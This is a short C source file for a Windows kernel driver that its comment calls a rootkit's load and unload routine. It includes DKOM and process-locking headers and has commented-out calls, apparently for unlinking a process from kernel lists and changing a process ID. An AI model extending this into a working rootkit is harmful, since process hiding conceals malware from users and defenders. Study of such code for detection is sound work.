/*
        driver.c

        Rootkit load/unload.
*/

#include <ntddk.h>
#include "dkom.h"
#include "lock_proc.h"

void driver_unload(PDRIVER_OBJECT driver_obj) {
        UNREFERENCED_PARAMETER(driver_obj);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path) {
        UNREFERENCED_PARAMETER(reg_path);

        driver_obj->DriverUnload = driver_unload;

        //proc_unlink(0x492C);

        //proc_set_pid(0xB88);

        return STATUS_SUCCESS;
}